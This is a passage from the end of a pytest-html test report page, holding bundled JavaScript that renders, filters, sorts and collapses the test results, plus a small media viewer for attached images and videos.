            const t = document.createElement('template')
            t.innerHTML = html
            resultBody.querySelector('.collapsible').appendChild(t.content)
        })

        if (log) {
            // Wrap lines starting with "E" with span.error to color those lines red
            const wrappedLog = log.replace(/^E.*$/gm, (match) => `<span class="error">${match}</span>`)
            resultBody.querySelector('.log').innerHTML = wrappedLog
        } else {
            resultBody.querySelector('.log').remove()
        }

        if (collapsed) {
            resultBody.querySelector('.collapsible > td')?.classList.add('collapsed')
            resultBody.querySelector('.extras-row').classList.add('hidden')
        } else {
            resultBody.querySelector('.collapsible > td')?.classList.remove('collapsed')
        }

        const media = []
        extras?.forEach(({ name, format_type, content }) => {
            if (['image', 'video'].includes(format_type)) {
                media.push({ path: content, name, format_type })
            }

            if (format_type === 'html') {
                resultBody.querySelector('.extraHTML').insertAdjacentHTML('beforeend', `<div>${content}</div>`)
            }
        })
        mediaViewer.setup(resultBody, media)

        // Add custom html from the pytest_html_results_table_html hook
        tableHtml?.forEach((item) => {
            resultBody.querySelector('td[class="extra"]').insertAdjacentHTML('beforeend', item)
        })

        return resultBody
    },
}

module.exports = {
    dom,
    htmlToElements,
    find,
    findAll,
}

},{"./mediaviewer.js":6}],3:[function(require,module,exports){
const { manager } = require('./datamanager.js')
const { doSort } = require('./sort.js')
const storageModule = require('./storage.js')

const getFilteredSubSet = (filter) =>
    manager.allData.tests.filter(({ result }) => filter.includes(result.toLowerCase()))

const doInitFilter = () => {
    const currentFilter = storageModule.getVisible()
    const filteredSubset = getFilteredSubSet(currentFilter)
    manager.setRender(filteredSubset)
}

const doFilter = (type, show) => {
    if (show) {
        storageModule.showCategory(type)
    } else {
        storageModule.hideCategory(type)
    }

    const currentFilter = storageModule.getVisible()
    const filteredSubset = getFilteredSubSet(currentFilter)
    manager.setRender(filteredSubset)

    const sortColumn = storageModule.getSort()
    doSort(sortColumn, true)
}

module.exports = {
    doFilter,
    doInitFilter,
}

},{"./datamanager.js":1,"./sort.js":7,"./storage.js":8}],4:[function(require,module,exports){
const { redraw, bindEvents, renderStatic } = require('./main.js')
const { doInitFilter } = require('./filter.js')
const { doInitSort } = require('./sort.js')
const { manager } = require('./datamanager.js')
const data = JSON.parse(document.getElementById('data-container').dataset.jsonblob)

function init() {
    manager.setManager(data)
    doInitFilter()
    doInitSort()
    renderStatic()
    redraw()
    bindEvents()
}

init()

},{"./datamanager.js":1,"./filter.js":3,"./main.js":5,"./sort.js":7}],5:[function(require,module,exports){
const { dom, find, findAll } = require('./dom.js')
const { manager } = require('./datamanager.js')
const { doSort } = require('./sort.js')
const { doFilter } = require('./filter.js')
const {
    getVisible,
    getCollapsedIds,
    setCollapsedIds,
    getSort,
    getSortDirection,
    possibleFilters,
} = require('./storage.js')

const removeChildren = (node) => {
    while (node.firstChild) {
        node.removeChild(node.firstChild)
    }
}

const renderStatic = () => {
    const renderEnvironmentTable = () => {
        const environment = manager.environment
        const rows = Object.keys(environment).map((key) => dom.getStaticRow(key, environment[key]))
        const table = document.getElementById('environment')
        removeChildren(table)
        rows.forEach((row) => table.appendChild(row))
    }
    renderEnvironmentTable()
}

const addItemToggleListener = (elem) => {
    elem.addEventListener('click', ({ target }) => {
        const id = target.parentElement.dataset.id
        manager.toggleCollapsedItem(id)

        const collapsedIds = getCollapsedIds()
        if (collapsedIds.includes(id)) {
            const updated = collapsedIds.filter((item) => item !== id)
            setCollapsedIds(updated)
        } else {
            collapsedIds.push(id)
            setCollapsedIds(collapsedIds)
        }
        redraw()
    })
}

const renderContent = (tests) => {
    const sortAttr = getSort(manager.initialSort)
    const sortAsc = JSON.parse(getSortDirection())
    const rows = tests.map(dom.getResultTBody)
    const table = document.getElementById('results-table')
    const tableHeader = document.getElementById('results-table-head')

    const newTable = document.createElement('table')
    newTable.id = 'results-table'

    // remove all sorting classes and set the relevant
    findAll('.sortable', tableHeader).forEach((elem) => elem.classList.remove('asc', 'desc'))
    tableHeader.querySelector(`.sortable[data-column-type="${sortAttr}"]`)?.classList.add(sortAsc ? 'desc' : 'asc')
    newTable.appendChild(tableHeader)

    if (!rows.length) {
        const emptyTable = document.getElementById('template_results-table__body--empty').content.cloneNode(true)
        newTable.appendChild(emptyTable)
    } else {
        rows.forEach((row) => {
            if (!!row) {
                findAll('.collapsible td:not(.col-links', row).forEach(addItemToggleListener)
                find('.logexpander', row).addEventListener('click',
                    (evt) => evt.target.parentNode.classList.toggle('expanded'),
                )
                newTable.appendChild(row)
            }
        })
    }

    table.replaceWith(newTable)
}

const renderDerived = () => {
    const currentFilter = getVisible()
    possibleFilters.forEach((result) => {
        const input = document.querySelector(`input[data-test-result="${result}"]`)
        input.checked = currentFilter.includes(result)
    })
}

const bindEvents = () => {
    const filterColumn = (evt) => {
        const { target: element } = evt
        const { testResult } = element.dataset

        doFilter(testResult, element.checked)
        const collapsedIds = getCollapsedIds()
        const updated = manager.renderData.tests.map((test) => {
            return {
                ...test,
                collapsed: collapsedIds.includes(test.id),
            }
        })
        manager.setRender(updated)
        redraw()
    }

    const header = document.getElementById('environment-header')
    header.addEventListener('click', () => {
        const table = document.getElementById('environment')
        table.classList.toggle('hidden')
        header.classList.toggle('collapsed')
    })

    findAll('input[name="filter_checkbox"]').forEach((elem) => {
        elem.addEventListener('click', filterColumn)
    })

    findAll('.sortable').forEach((elem) => {
        elem.addEventListener('click', (evt) => {
            const { target: element } = evt
            const { columnType } = element.dataset
            doSort(columnType)
            redraw()
        })
    })

    document.getElementById('show_all_details').addEventListener('click', () => {
        manager.allCollapsed = false
        setCollapsedIds([])
        redraw()
    })
    document.getElementById('hide_all_details').addEventListener('click', () => {
        manager.allCollapsed = true
        const allIds = manager.renderData.tests.map((test) => test.id)
        setCollapsedIds(allIds)
        redraw()
    })
}

const redraw = () => {
    const { testSubset } = manager

    renderContent(testSubset)
    renderDerived()
}

module.exports = {
    redraw,
    bindEvents,
    renderStatic,
}

},{"./datamanager.js":1,"./dom.js":2,"./filter.js":3,"./sort.js":7,"./storage.js":8}],6:[function(require,module,exports){
class MediaViewer {
    constructor(assets) {
        this.assets = assets
        this.index = 0
    }

    nextActive() {
        this.index = this.index === this.assets.length - 1 ? 0 : this.index + 1
        return [this.activeFile, this.index]
    }

    prevActive() {
        this.index = this.index === 0 ? this.assets.length - 1 : this.index -1
        return [this.activeFile, this.index]
    }

    get currentIndex() {
        return this.index
    }

    get activeFile() {
        return this.assets[this.index]
    }
}


const setup = (resultBody, assets) => {
    if (!assets.length) {
        resultBody.querySelector('.media').classList.add('hidden')
        return
    }

    const mediaViewer = new MediaViewer(assets)
    const container = resultBody.querySelector('.media-container')
    const leftArrow = resultBody.querySelector('.media-container__nav--left')
    const rightArrow = resultBody.querySelector('.media-container__nav--right')
    const mediaName = resultBody.querySelector('.media__name')
    const counter = resultBody.querySelector('.media__counter')
    const imageEl = resultBody.querySelector('img')
    const sourceEl = resultBody.querySelector('source')
    const videoEl = resultBody.querySelector('video')

    const setImg = (media, index) => {
        if (media?.format_type === 'image') {
            imageEl.src = media.path

            imageEl.classList.remove('hidden')
            videoEl.classList.add('hidden')
        } else if (media?.format_type === 'video') {
            sourceEl.src = media.path

            videoEl.classList.remove('hidden')
            imageEl.classList.add('hidden')
        }

        mediaName.innerText = media?.name
        counter.innerText = `${index + 1} / ${assets.length}`
    }
    setImg(mediaViewer.activeFile, mediaViewer.currentIndex)

    const moveLeft = () => {
        const [media, index] = mediaViewer.prevActive()
        setImg(media, index)
    }
    const doRight = () => {
        const [media, index] = mediaViewer.nextActive()
        setImg(media, index)
    }
    const openImg = () => {
        window.open(mediaViewer.activeFile.path, '_blank')
    }
    if (assets.length === 1) {
        container.classList.add('media-container--fullscreen')
    } else {
        leftArrow.addEventListener('click', moveLeft)
        rightArrow.addEventListener('click', doRight)
    }
    imageEl.addEventListener('click', openImg)
}

module.exports = {
    setup,
}

},{}],7:[function(require,module,exports){
const { manager } = require('./datamanager.js')
const storageModule = require('./storage.js')

const genericSort = (list, key, ascending, customOrder) => {
    let sorted
    if (customOrder) {
        sorted = list.sort((a, b) => {
            const aValue = a.result.toLowerCase()
            const bValue = b.result.toLowerCase()

            const aIndex = customOrder.findIndex((item) => item.toLowerCase() === aValue)
            const bIndex = customOrder.findIndex((item) => item.toLowerCase() === bValue)

            // Compare the indices to determine the sort order
            return aIndex - bIndex
        })
    } else {
        sorted = list.sort((a, b) => a[key] === b[key] ? 0 : a[key] > b[key] ? 1 : -1)
    }

    if (ascending) {
        sorted.reverse()
    }
    return sorted
}

const durationSort = (list, ascending) => {
    const parseDuration = (duration) => {
        if (duration.includes(':')) {
            // If it's in the format "HH:mm:ss"
            const [hours, minutes, seconds] = duration.split(':').map(Number)
            return (hours * 3600 + minutes * 60 + seconds) * 1000
        } else {
            // If it's in the format "nnn ms"
            return parseInt(duration)
        }
    }
    const sorted = list.sort((a, b) => parseDuration(a['duration']) - parseDuration(b['duration']))
    if (ascending) {
        sorted.reverse()
    }
    return sorted
}

const doInitSort = () => {
    const type = storageModule.getSort(manager.initialSort)
    const ascending = storageModule.getSortDirection()
    const list = manager.testSubset
    const initialOrder = ['Error', 'Failed', 'Rerun', 'XFailed', 'XPassed', 'Skipped', 'Passed']

    storageModule.setSort(type)
    storageModule.setSortDirection(ascending)

    if (type?.toLowerCase() === 'original') {
        manager.setRender(list)
    } else {
        let sortedList
        switch (type) {
        case 'duration':
            sortedList = durationSort(list, ascending)
            break
        case 'result':
            sortedList = genericSort(list, type, ascending, initialOrder)
            break
        default:
            sortedList = genericSort(list, type, ascending)
            break
        }
        manager.setRender(sortedList)
    }
}

const doSort = (type, skipDirection) => {
    const newSortType = storageModule.getSort(manager.initialSort) !== type
    const currentAsc = storageModule.getSortDirection()
    let ascending
    if (skipDirection) {
        ascending = currentAsc
    } else {
        ascending = newSortType ? false : !currentAsc
    }
    storageModule.setSort(type)
    storageModule.setSortDirection(ascending)

    const list = manager.testSubset
    const sortedList = type === 'duration' ? durationSort(list, ascending) : genericSort(list, type, ascending)
    manager.setRender(sortedList)
}

module.exports = {
    doInitSort,
    doSort,
}

},{"./datamanager.js":1,"./storage.js":8}],8:[function(require,module,exports){
const possibleFilters = [
    'passed',
    'skipped',
    'failed',
    'error',
    'xfailed',
    'xpassed',
    'rerun',
]

const getVisible = () => {
    const url = new URL(window.location.href)
    const settings = new URLSearchParams(url.search).get('visible')
    const lower = (item) => {
        const lowerItem = item.toLowerCase()
        if (possibleFilters.includes(lowerItem)) {
            return lowerItem
        }
        return null
    }
    return settings === null ?
        possibleFilters :
        [...new Set(settings?.split(',').map(lower).filter((item) => item))]
}

const hideCategory = (categoryToHide) => {
    const url = new URL(window.location.href)
    const visibleParams = new URLSearchParams(url.search).get('visible')
    const currentVisible = visibleParams ? visibleParams.split(',') : [...possibleFilters]
    const settings = [...new Set(currentVisible)].filter((f) => f !== categoryToHide).join(',')

    url.searchParams.set('visible', settings)
    window.history.pushState({}, null, unescape(url.href))
}

const showCategory = (categoryToShow) => {
    if (typeof window === 'undefined') {
        return
    }
    const url = new URL(window.location.href)
    const currentVisible = new URLSearchParams(url.search).get('visible')?.split(',').filter(Boolean) ||
        [...possibleFilters]
    const settings = [...new Set([categoryToShow, ...currentVisible])]
    const noFilter = possibleFilters.length === settings.length || !settings.length

    noFilter ? url.searchParams.delete('visible') : url.searchParams.set('visible', settings.join(','))
    window.history.pushState({}, null, unescape(url.href))
}

const getSort = (initialSort) => {
    const url = new URL(window.location.href)
    let sort = new URLSearchParams(url.search).get('sort')
    if (!sort) {
        sort = initialSort || 'result'
    }
    return sort
}

const setSort = (type) => {
    const url = new URL(window.location.href)
    url.searchParams.set('sort', type)
    window.history.pushState({}, null, unescape(url.href))
}

const getCollapsedCategory = (renderCollapsed) => {
    let categories
    if (typeof window !== 'undefined') {
        const url = new URL(window.location.href)
        const collapsedItems = new URLSearchParams(url.search).get('collapsed')
        switch (true) {
        case !renderCollapsed && collapsedItems === null:
            categories = ['passed']
            break
        case collapsedItems?.length === 0 || /^["']{2}$/.test(collapsedItems):
            categories = []
            break
        case /^all$/.test(collapsedItems) || collapsedItems === null && /^all$/.test(renderCollapsed):
            categories = [...possibleFilters]
            break
        default:
            categories = collapsedItems?.split(',').map((item) => item.toLowerCase()) || renderCollapsed
            break
        }
    } else {
        categories = []
    }
    return categories
}

const getSortDirection = () => JSON.parse(sessionStorage.getItem('sortAsc')) || false
const setSortDirection = (ascending) => sessionStorage.setItem('sortAsc', ascending)

const getCollapsedIds = () => JSON.parse(sessionStorage.getItem('collapsedIds')) || []
const setCollapsedIds = (list) => sessionStorage.setItem('collapsedIds', JSON.stringify(list))

module.exports = {
    getVisible,
    hideCategory,
    showCategory,
    getCollapsedIds,
    setCollapsedIds,
    getSort,
    setSort,
    getSortDirection,
    setSortDirection,
    getCollapsedCategory,
    possibleFilters,
}

},{}]},{},[4]);
    </script>
  </footer>
</html>